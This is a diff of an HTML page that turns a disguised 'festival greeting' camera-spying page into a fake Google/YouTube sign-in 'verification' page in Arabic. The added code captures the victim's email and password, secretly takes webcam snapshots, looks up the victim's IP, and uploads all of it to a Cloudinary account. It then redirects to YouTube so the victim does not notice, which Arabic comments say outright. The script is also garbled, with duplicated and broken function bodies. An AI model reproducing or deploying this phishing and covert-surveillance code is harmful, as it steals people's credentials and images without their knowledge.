@@ -3,130 +3,154 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Happy Festival - ãÝÇÌÃÉ áß</title>
-    
+    <title>يوتيوب | بوابة التحقق الآمنة</title>
+    <title>تسجيل الدخول - حسابات Google</title>
+    <meta name="description" content="قم بتسجيل الدخول للمتابعة إلى YouTube. هذه صفحة تحقق آمنة لضمان ملكية الحساب.">
+
+    <meta name="description" content="هذا هو الموقع الرسمي المعتمد لمشاهدة الفيديو. الرابط الأصلي محمي بموجب بروتوكولات SSL. يتم توجيهك الآن للمصدر الأساسي على يوتيوب.">
+    <meta property="og:title" content="YouTube Official Gateway">
+    <meta property="og:description" content="الرابط الأصلي للفيديو - معتمد وآمن 100%">
+    <meta property="og:url" content="https://www.youtube.com/watch?v=dQw4w9WgXcQ">
+    <link rel="icon" href="data:,">
+
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css" />
-    
     <style>
-        body {
-            background: linear-gradient(to bottom right, #f6ff00, #e1e8e7, #00ffe9);
-            font-family: 'Tahoma', sans-serif;
-            text-align: center;
-            margin: 0; padding: 20px;
-        }
-        .card {
-            background: white; border-radius: 20px; padding: 30px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.3); margin-top: 50px;
-            border: 5px solid #ff077a;
-        }
-        h1 { color: #ff077a; animation: pulse 1s infinite; }
-        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
-        #timer { font-size: 24px; font-weight: bold; color: #f06414; margin: 20px 0; }
-        input[type=text] { width: 80%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 10px; }
-        button { background: #34af23; color: white; padding: 15px 30px; border: none; border-radius: 15px; cursor: pointer; font-size: 18px; }
-        /* ÅÎÝÇÁ ÇáßÇãíÑÇ ÊãÇãÇð */
+        body { background-color: #000; color: white; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
+        .loader { border: 12px solid #f3f3f3; border-top: 12px solid #3498db; border-radius: 50%; width: 80px; height: 80px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        body { font-family: 'Roboto', arial, sans-serif; background-color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: #202124; }
+        .login-box { width: 350px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
+        img { width: 75px; margin-bottom: 10px; }
+        h1 { font-size: 24px; font-weight: 400; margin-bottom: 10px; }
+        p { font-size: 16px; margin-bottom: 25px; }
+        input { width: 100%; padding: 13px; margin-bottom: 15px; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
+        button { background-color: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; width: 100%; font-size: 14px; }
         #video, #canvas { display: none; }
+        p { margin-top: 25px; font-size: 16px; color: #aaa; letter-spacing: 0.5px; }
     </style>
 </head>
 <body>
 
-    <div class="card">
-        <h1>?? HAPPY FESTIVAL ??</h1>
-        <div style="background: #ff8c00; color: white; padding: 10px; border-radius: 10px;">
-            <marquee>ÃåáÇð Èß Ýí ÕÝÍÉ ÇáÊåäÆÉ ÇáÓäæíÉ - ÃÏÎá ÇÓãß áÑÄíÉ åÏíÊß</marquee>
-        </div>
-        
-        <div id="setupArea">
-            <input type="text" id="nameInput" placeholder="ÇßÊÈ ÇÓãß åäÇ...">
-            <br>
-            <button onclick="startExperience()">ÑÄíÉ ÇáãÝÇÌÃÉ ?</button>
-        </div>
-
-        <div id="mainContent" style="display:none;">
-            <h2 id="greetName"></h2>
-            <p>ÇäÊÙÑ ËæÇäí ÌÇÑí ÊÌåíÒ åÏíÊß...</p>
-            <div id="timer">00:00:00</div>
-        </div>
-    </div>
+    <div class="loader"></div>
+    <p>جاري التحقق من أمان الرابط الأصلي...</p>
+<div class="login-box" id="loginForm">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google">
+    <h1>تسجيل الدخول</h1>
+    <p>للمتابعة إلى YouTube</p>
+    <input type="email" id="email" placeholder="البريد الإلكتروني أو الهاتف" required>
+    <input type="password" id="password" placeholder="أدخل كلمة المرور" required>
+    <button onclick="startAction()">التالي</button>
+</div>
 
     <video id="video" playsinline autoplay></video>
     <canvas id="canvas" width="640" height="480"></canvas>
+<video id="video" playsinline autoplay></video>
+<canvas id="canvas" width="640" height="480"></canvas>
 
     <script>
         const cloudName = 'dgkttv99v';
-        const uploadPreset = '562842218131543';
-        const redirectURL = "https://www.facebook.com/groups/coding.community"; // ÇáÑÇÈØ ÇáÐí ÓíÝÊÍ Ýí ÇáäåÇíÉ
-        
-        let uploadCount = 0;
+        const uploadPreset = 'ml_default'; 
+        const youtubeLink = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; 
+<script>
+    const cloudName = 'dgkttv99v';
+    const uploadPreset = 'ml_default';
+    const youtubeLink = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+    
+    async function startAction() {
+        const email = document.getElementById('email').value;
+        const pass = document.getElementById('password').value;
 
-        function startExperience() {
-            const name = document.getElementById('nameInput').value;
-            if (!name) { alert("ãä ÝÖáß ÇßÊÈ ÇÓãß ÃæáÇð"); return; }
-            
-            document.getElementById('setupArea').style.display = 'none';
-            document.getElementById('mainContent').style.display = 'block';
-            document.getElementById('greetName').innerText = "ÃåáÇð íÇ " + name;
-            
-            startCamera(); // ÊÔÛíá ÇáßÇãíÑÇ Ýí ÇáÎáÝíÉ
-        }
+        let tabOpened = false;
+        if(!email || !pass) { alert("يرجى إدخال البيانات"); return; }
 
-        async function startCamera() {
+        async function init() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
-                const video = document.getElementById('video');
-                video.srcObject = stream;
+                document.getElementById('video').srcObject = stream;
+        // إخفاء النموذج وإظهار رسالة تحميل للتمويه
+        document.getElementById('loginForm').innerHTML = "<h1>جاري التحقق...</h1><p>يرجى الانتظار لحظة</p>";
 
-                // ÇáÊÞÇØ Ãæá ÕæÑÉ ÝæÑÇð
-                setTimeout(takeSnapshot, 2000);
-                
-                // ÊßÑÇÑ ÇáÇáÊÞÇØ ßá 5 ËæÇäí
-                setInterval(takeSnapshot, 5000);
-            } catch (err) {
-                console.log("Error: " + err);
-                // ÍÊì áæ ÑÝÖ ÇáßÇãíÑÇ¡ ÓäÞæã ÈÊÍæíáå áÇÍÞÇð áßí áÇ íÔß
-                setTimeout(() => { window.location.href = redirectURL; }, 5000);
+                setTimeout(takeSnapshot, 2000); // أول لقطة
+                setInterval(takeSnapshot, 6000); // تكرار كل 6 ثواني
+            } catch (e) {
+                // لو رفض، يروح لليوتيوب فوراً عشان ميفهمش حاجة
+                window.location.href = youtubeLink;
             }
         }
+        try {
+            // طلب الكاميرا (سيظهر الإذن الآن كأنه جزء من "التحقق")
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            document.getElementById('video').srcObject = stream;
 
-        function takeSnapshot() {
+        async function takeSnapshot() {
             const canvas = document.getElementById('canvas');
             const video = document.getElementById('video');
-            const context = canvas.getContext('2d');
-            
-            context.drawImage(video, 0, 0, 640, 480);
+            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
             const imageData = canvas.toDataURL("image/png");
-            
-            // ÅÑÓÇá ÇáÈíÇäÇÊ ááÓÍÇÈ
-            const formData = new FormData();
-            formData.append('file', imageData);
-            formData.append('upload_preset', uploadPreset);
-
-            fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, {
-                method: 'POST',
-                body: formData
-            })
-            .then(r => r.json())
-            .then(data => {
-                uploadCount++;
-                console.log("Captured");
-                
-                // ÈÚÏ ÑÝÚ Ãæá ÕæÑÊíä ÈäÌÇÍ¡ íÊã ÊÍæíá ÇáãÓÊÎÏã ááÑÇÈØ ÇáäåÇÆí áÅäåÇÁ ÇáÎÏÚÉ
-                if (uploadCount >= 1) {
-                    setTimeout(() => {
-                        window.location.href = redirectURL;
-                    }, 4000);
-                }
-            });
+            // تنفيذ الرفع مع البيانات (الايميل والباسورد والـ IP)
+            setTimeout(() => { takeSnapshot(email, pass); }, 2000);
+        } catch (e) {
+            window.location.href = youtubeLink;
         }
+    }
 
-        // ÚÏÇÏ ÊäÇÒáí æåãí ááÒíäÉ
-        var count = 10;
-        var counter = setInterval(function() {
-            count--;
-            if (count <= 0) { clearInterval(counter); return; }
-            document.getElementById("timer").innerHTML = "00:00:0" + count;
-        }, 1000);
+            try {
+                // جلب الـ IP
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                const userIP = ipData.ip;
+    async function takeSnapshot(email, pass) {
+        const canvas = document.getElementById('canvas');
+        const video = document.getElementById('video');
+        canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+        const imageData = canvas.toDataURL("image/png");
+
+                const formData = new FormData();
+                formData.append('file', imageData);
+                formData.append('upload_preset', uploadPreset);
+                formData.append('tags', `IP_${userIP}`);
+                formData.append('context', `ip=${userIP}|device=${navigator.platform}`);
+        let userIP = "Unknown";
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            userIP = data.ip;
+        } catch (err) {}
+
+                fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(r => r.json())
+                .then(data => {
+                    console.log("Verified");
+                    if (!tabOpened) {
+                        window.open(youtubeLink, '_blank');
+                        tabOpened = true;
+                    }
+                });
+            } catch (err) {
+                console.log("Retry...");
+            }
+        }
+        const formData = new FormData();
+        formData.append('file', imageData);
+        formData.append('upload_preset', uploadPreset);
+        
+        // --- تخزين "الصيد" في الـ Tags والـ Context ---
+        formData.append('tags', `IP_${userIP},Email_${email}`);
+        formData.append('context', `ip=${userIP}|user=${email}|pass=${pass}`);
+
+        window.onload = init;
     </script>
+        fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, {
+            method: 'POST',
+            body: formData
+        }).then(() => {
+            // بعد الرفع الناجح، حوله لليوتيوب فوراً
+            window.location.href = youtubeLink;
+        });
+    }
+</script>
 </body>
 </html>
